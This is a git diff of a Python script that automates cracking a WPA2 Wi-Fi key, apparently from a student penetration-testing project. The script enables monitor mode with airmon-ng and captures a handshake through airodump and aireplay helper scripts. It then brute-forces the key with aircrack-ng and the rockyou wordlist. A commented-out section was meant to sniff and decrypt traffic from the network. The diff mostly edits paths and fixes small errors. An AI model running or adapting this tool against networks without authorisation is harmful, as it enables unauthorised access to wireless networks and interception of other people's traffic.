@@ -5,6 +5,7 @@ import os.path
 from scapy.all import *
 import subprocess as sub
 
+
 class sniffer():
     def __init__(self):
         start = input("First time starting up? [Y/N]:")
@@ -15,7 +16,7 @@ class sniffer():
             print("Starting wlan1mon")
             os.system("sudo airmon-ng start wlan1 1")
             print("Done")
-        print("which wifi u want to crack")
+        print("Which wifi do you want to crack")
         self.wifi = input("Wifi name: ")
         self.find_mac()
 
@@ -33,31 +34,31 @@ class sniffer():
         if not os.path.isfile("WPA_{}-01.cap".format(self.mac)):
             self.make_cap()
         print("Cracking the key")
-        os.system("sudo aircrack-ng WPA_{}-01.cap -w rockyou.txt>key_info.txt".format(self.mac))
+        os.system("sudo aircrack-ng /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/WPA_{}-01.cap -w /home/kali/rockyou.txt>key_info.txt".format(self.mac))
         key_file = open("key_info.txt", "r").read()
         index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
-        self.key = []
+        self.key = ""
         while key_file[index] != ' ':
-            self.key.append(key_file[index])
+            self.key += key_file[index]
             index += 1
         print("Key has been found: {}".format(self.key))
         print("Starting to sniff")
         self.sniff_packets()
 
-    def filtersniff(self, packet):
+    #def filtersniff(self, packet):
         # DIT MOET WAARSCHIJNLIJK HELEMAAL ANDERS ZIJN?
-        if packet[0].addr1 == self.mac or packet[0].addr2 == self.mac or packet[0].addr3 == self.mac:
-            iv = bytes_hex(packet[0].iv).decode('utf-8')
-            wepdata = bytes_hex(packet[0].wepdata).decode('utf-8')
-            iv = ' '.join(iv[i:i + 2] for i in range(0, len(iv), 2))
-            wepdata = ' '.join(wepdata[i:i + 2] for i in range(0, len(wepdata), 2))
-            unencrypted_message = RC4.decryption(self.key, wepdata, iv)
-            unencrypted_message = self.filter_packets(unencrypted_message)
-            return 'from: ' + packet[0].addr3 + ' --> to: ' + packet[0].addr1 + '\nmessage :' + unencrypted_message
+    #    if packet[0].addr1 == self.mac or packet[0].addr2 == self.mac or packet[0].addr3 == self.mac:
+    #        iv = bytes_hex(packet[0].iv).decode('utf-8')
+    #        wepdata = bytes_hex(packet[0].wepdata).decode('utf-8')
+    #        iv = ' '.join(iv[i:i + 2] for i in range(0, len(iv), 2))
+    #        wepdata = ' '.join(wepdata[i:i + 2] for i in range(0, len(wepdata), 2))
+    #        unencrypted_message = RC4.decryption(self.key, wepdata, iv)
+    #        unencrypted_message = self.filter_packets(unencrypted_message)
+    #        return 'from: ' + packet[0].addr3 + ' --> to: ' + packet[0].addr1 + '\nmessage :' + unencrypted_message
 
-    def sniff_packets(self):
-        # DIT OOK ANDERS
-        sniff(iface='wlan1mon', lfilter=lambda x: x.haslayer('Dot11WEP'), prn=self.filtersniff)
+    #def sniff_packets(self):
+    #    # DIT OOK ANDERS
+    #    sniff(iface='wlan1mon', lfilter=lambda x: x.haslayer('Dot11WEP'), prn=self.filtersniff)
 
     def filter_packets(self, message):
         alfabet = [chr(elem) for elem in range(48, 123)]
@@ -77,9 +78,10 @@ class sniffer():
         return filtered_message
 
     def make_cap(self):
-        process1 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Documents/new_sniffer/AirodumpWPA2.py {}".format(self.mac)])
-        process2 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Documents/new_sniffer/AireplayWPA2.py {}".format(self.mac)])
+        process2 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/AirodumpWPA2.py {}".format(self.mac)])
+        process1 = sub.Popen(["xterm", "-e", "sudo python3 /home/kali/Downloads/PenO3-Kali-WPA2-Construct/WPA2/AireplayWPA2.py {}".format(self.mac)])
         process1.wait()
         process2.wait()
+
 
 sniffer()
